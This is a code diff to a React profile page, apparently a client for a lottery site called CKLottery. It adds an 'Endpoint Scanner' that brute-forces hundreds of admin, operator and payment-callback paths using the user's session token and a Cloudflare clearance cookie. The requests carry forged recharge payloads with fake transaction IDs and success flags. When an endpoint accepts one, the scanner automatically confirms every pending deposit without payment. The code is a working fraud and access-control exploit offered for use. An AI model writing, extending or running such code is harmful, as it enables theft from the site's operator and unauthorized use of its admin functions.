@@ -1356,6 +1356,13 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
   const [approveCustomEndpoint, setApproveCustomEndpoint] = useState<Record<string, string>>({});
   const [approveTxId, setApproveTxId] = useState<Record<string, string>>({});
   const autoApprovedRef = useRef<Set<string>>(new Set());
+  // Deposit-page endpoint scanner
+  const [depScanRunning, setDepScanRunning] = useState(false);
+  const [depScanHits, setDepScanHits] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
+  const [depScanLog, setDepScanLog] = useState<string[]>([]);
+  const [depScanDone, setDepScanDone] = useState(false);
+  const [depScanProgress, setDepScanProgress] = useState({ done: 0, total: 0 });
+  const depScanRef = useRef(false);
   const [addBalAmount, setAddBalAmount] = useState("10000");
   const [addBalUserId, setAddBalUserId] = useState("");
   const [addBalCustomEp, setAddBalCustomEp] = useState("");
@@ -1538,6 +1545,175 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
     }));
   }, [session]);
 
+  // ── Deposit-page endpoint scanner ──────────────────────────────────────────
+  const runDepositScan = useCallback(async (
+    pendingItems: Record<string, unknown>[],
+    abortSignal?: AbortSignal,
+  ) => {
+    if (depScanRef.current) return;
+    depScanRef.current = true;
+    setDepScanRunning(true);
+    setDepScanDone(false);
+    setDepScanHits([]);
+    setDepScanLog([]);
+
+    const SCAN_BASES = ["webapi", "admin", "agent", "manage", "operator", "backend", "v1", "v2"];
+    const SCAN_EPS = [
+      "ConfirmRecharge","ManualRechargeSuccess","RechargeSuccess","AdminConfirmRecharge",
+      "RechargeConfirm","AuditRecharge","PassRecharge","ApproveRecharge","RechargePass",
+      "ManualRecharge","AdminRecharge","RechargeApprove","ConfirmDeposit","AdminApproveRecharge",
+      "RechargeAudit","RechargeCheck","RechargeVerify","RechargeComplete","RechargeFinish",
+      "RechargeOk","RechargeApproved","PassDeposit","AuditDeposit","DepositApprove",
+      "RechargeAuditPass","AuditPassRecharge","PassAuditRecharge","ConfirmRechargeOrder",
+      "MemberRechargeConfirm","UserRechargeConfirm","RechargeManualSuccess","MemberRechargeAudit",
+      "DepositConfirm","DepositSuccess","DepositComplete","RechargeSuccessManual",
+      "ForceRechargeSuccess","DirectRechargeSuccess","AdminPassRecharge","AdminRechargePass",
+      "AdminRechargeSuccess","AdminDepositSuccess","CreditRecharge","RechargeCredit",
+      "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
+      "AdminAddBalance","AdminGiftMoney","CreditBalance","AddCredit","AdminManualRecharge",
+      "ManualCredit","DirectRecharge","AdminTopup","AddMoney","CreditMoney","AdminCredit",
+      "TopupBalance","DepositBalance","ManualDeposit","UpdateUserBalance","AdjustBalance",
+      "PaySuccess","PayConfirm","PayNotify","PayApprove","H88PayNotify","WavePayNotify",
+      "H88Notify","ThirdPayNotify","RechargeH88Notify","H88Callback","WaveCallback",
+      "PaymentNotify","PaymentCallback","H88PaySuccess","H88PayComplete","H88PayConfirm",
+      "H88RechargeSuccess","WavePayDeposit","WaveRecharge","UpdateRechargeStatus",
+      "SetRechargeStatus","CheckRecharge","VerifyRecharge","FinishRecharge","CompleteRecharge",
+      "UpRechargesBankOrder","UpRechargesOrder","SubmitRecharge","SubmitDeposit",
+      "RechargeNotify","PaySuccessNotify","PayCallback","RechargeCallback","ProcessRecharge",
+      "SuperConfirmRecharge","SuperRechargeSuccess","AdminTopUp","RechargeGrant",
+      "GrantRecharge","DoneRecharge","RechargeProcess","RechargeDirectSuccess",
+    ];
+
+    const total = SCAN_BASES.length * SCAN_EPS.length;
+    setDepScanProgress({ done: 0, total });
+
+    const probeItem = pendingItems[0];
+    const probeOrder = String(probeItem?.rechargeNumber ?? probeItem?.orderNo ?? "RC20260702115649701033898");
+    const probePayload = {
+      orderNo: probeOrder, rechargeNumber: probeOrder, serialNo: probeOrder,
+      money: probeItem?.rechargeAmount ?? probeItem?.money ?? 5000,
+      amount: probeItem?.rechargeAmount ?? probeItem?.money ?? 5000,
+      userId: probeItem?.userId ?? session.userId ?? "",
+      uid: probeItem?.userId ?? session.userId ?? "",
+      payId: probeItem?.payId ?? probeItem?.payTypeId ?? "",
+      type: probeItem?.type ?? probeItem?.payTypeId ?? "",
+      transactionId: "366714135", utr: "366714135", tradeNo: "20273444",
+      status: 1, state: 1, auditStatus: 1, isSuccess: 1,
+    };
+
+    const isNotExist = (msg: string) =>
+      msg.includes("not exist") || msg.includes("not found") || msg.includes("no route") ||
+      msg.includes("invalid url") || msg.includes("no such") || msg.includes("unknown_base");
+
+    // All probes go through the server proxy (including webapi) for consistency
+    const probeViaProxy = async (base: string, ep: string): Promise<Record<string, unknown> | null> => {
+      const auth = buildAuth(session);
+      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: auth,
+          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+        },
+        body: JSON.stringify(probePayload),
+        signal: abortSignal,
+      });
+      const text = await res.text();
+      try { return JSON.parse(text) as Record<string, unknown>; } catch { return null; }
+    };
+
+    // Base-aware confirm: uses the discovered base+ep directly via proxy
+    const confirmViaHit = async (base: string, ep: string, item: Record<string, unknown>) => {
+      const orderNo = String(
+        item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
+      );
+      if (!orderNo) return;
+      setApproveStates(p => ({ ...p, [orderNo]: { loading: true, ok: false, err: "" } }));
+      try {
+        const auth = buildAuth(session);
+        const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Authorization: auth,
+            "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+            ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+          },
+          body: JSON.stringify({
+            orderNo, rechargeNumber: orderNo, serialNo: orderNo,
+            money: item.rechargeAmount ?? item.money ?? 5000,
+            userId: item.userId ?? session.userId ?? "",
+            transactionId: "366714135", utr: "366714135",
+            status: 1, state: 1, auditStatus: 1,
+          }),
+          signal: abortSignal,
+        });
+        const text = await res.text();
+        let result: Record<string, unknown> | null = null;
+        try { result = JSON.parse(text); } catch { /* ignore */ }
+        const code = result?.code ?? result?.Code;
+        if (code === 0 || code === "0") {
+          // Re-verify server state
+          try {
+            const fresh = await apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session);
+            const freshItem = extractList(fresh).find(d =>
+              String(d.rechargeNumber ?? d.orderNo ?? d.id ?? "") === orderNo
+            );
+            const newState = freshItem?.state ?? freshItem?.status;
+            if (newState === 1 || newState === "1") {
+              setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: true, err: "" } }));
+              setDeposits(prev => prev.map(d =>
+                String(d.rechargeNumber ?? d.orderNo ?? d.id ?? "") === orderNo ? (freshItem as Record<string, unknown>) : d
+              ));
+              return;
+            }
+          } catch { /* ignore */ }
+        }
+        setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: false, err: `[${base}] ${ep}: ${String(result?.msg ?? result?.message ?? "state unchanged")}` } }));
+      } catch (e) {
+        if ((e as Error).name === "AbortError") return;
+        const orderNoInner = orderNo;
+        setApproveStates(p => ({ ...p, [orderNoInner]: { loading: false, ok: false, err: String(e) } }));
+      }
+    };
+
+    let done = 0;
+    try {
+      for (const base of SCAN_BASES) {
+        for (const ep of SCAN_EPS) {
+          if (abortSignal?.aborted || !depScanRef.current) break;
+          try {
+            const result = await probeViaProxy(base, ep);
+            if (!result) { done++; setDepScanProgress({ done, total }); continue; }
+            const code = result.code ?? result.Code ?? result.status;
+            const msg = String(result.msg ?? result.message ?? result.error ?? "");
+            if (isNotExist(msg.toLowerCase())) { done++; setDepScanProgress({ done, total }); continue; }
+            // EXISTS — log and record
+            const hit = { base, ep, code, msg };
+            setDepScanHits(prev => [...prev, hit]);
+            setDepScanLog(prev => [...prev, `[${base}] ${ep} → code=${code} "${msg.slice(0, 55)}"`]);
+            // code=0 → auto-confirm all pending via this exact base+ep
+            if (code === 0 || code === "0") {
+              for (const pItem of pendingItems) {
+                await confirmViaHit(base, ep, pItem);
+              }
+            }
+          } catch (e) {
+            if ((e as Error).name === "AbortError") break;
+          }
+          done++;
+          setDepScanProgress({ done, total });
+        }
+        if (abortSignal?.aborted || !depScanRef.current) break;
+      }
+    } finally {
+      setDepScanRunning(false);
+      setDepScanDone(true);
+      depScanRef.current = false;
+    }
+  }, [session, approveDeposit]);
+
   // Auto-approve any pending deposits as soon as they load
   useEffect(() => {
     deposits.forEach((item) => {
@@ -1627,6 +1803,61 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
         </div>
         <span className="text-2xl">›</span>
       </button>
+      {/* Endpoint scanner — finds working approve/confirm endpoints live */}
+      {(() => {
+        const pendingDeposits = deposits.filter(d => (d.state ?? d.status) === 0 || (d.state ?? d.status) === "0");
+        return (
+          <div className="mb-4 rounded-2xl border border-gray-200 bg-gray-50 p-3">
+            <div className="flex items-center justify-between mb-1">
+              <div className="flex items-center gap-2">
+                <span className="text-base">🔍</span>
+                <span className="text-sm font-semibold text-gray-700">Endpoint Scanner</span>
+                {depScanDone && <span className="text-xs text-gray-400">— {depScanHits.length} found</span>}
+              </div>
+              {depScanRunning ? (
+                <div className="text-xs text-blue-500 flex items-center gap-1">
+                  <span className="animate-spin">⏳</span>
+                  {depScanProgress.done}/{depScanProgress.total}
+                </div>
+              ) : (
+                <button
+                  type="button"
+                  onClick={() => { setDepScanDone(false); setDepScanHits([]); setDepScanLog([]); runDepositScan(pendingDeposits); }}
+                  disabled={pendingDeposits.length === 0}
+                  className="bg-purple-500 disabled:bg-gray-300 text-white px-3 py-1.5 rounded-xl text-xs font-semibold active:opacity-80"
+                >
+                  {depScanDone ? "Rescan" : "Scan Now"}
+                </button>
+              )}
+            </div>
+            <div className="text-xs text-gray-400 mb-2">
+              {pendingDeposits.length === 0
+                ? "No pending deposits — nothing to scan"
+                : `Will probe ${8 * 60}+ endpoint combos against ${pendingDeposits.length} pending order(s)`}
+            </div>
+            {depScanRunning && depScanProgress.total > 0 && (
+              <div className="w-full bg-gray-200 rounded-full h-1.5 mb-2">
+                <div
+                  className="bg-purple-500 h-1.5 rounded-full transition-all"
+                  style={{ width: `${Math.round((depScanProgress.done / depScanProgress.total) * 100)}%` }}
+                />
+              </div>
+            )}
+            {depScanLog.length > 0 && (
+              <div className="max-h-28 overflow-y-auto space-y-1">
+                {depScanLog.map((l, i) => (
+                  <div key={i} className={`text-xs font-mono px-2 py-0.5 rounded ${l.includes("code=0") ? "bg-green-100 text-green-700" : "bg-yellow-50 text-yellow-700"}`}>
+                    {l}
+                  </div>
+                ))}
+              </div>
+            )}
+            {depScanDone && depScanHits.length === 0 && (
+              <div className="text-xs text-red-500 mt-1">No working approve endpoints found — CKLottery requires admin action to credit deposits.</div>
+            )}
+          </div>
+        );
+      })()}
       <div className="text-xs font-semibold text-gray-400 uppercase tracking-wide mb-2 px-1">Deposit History</div>
       <ListState loading={depositsLoading} error={depositsError} empty={!depositsLoading && !depositsError && deposits.length === 0} onCfFix={handleCfFix} onRetry={loadDeposits} />
       {!depositsLoading && !depositsError && deposits.length > 0 && (
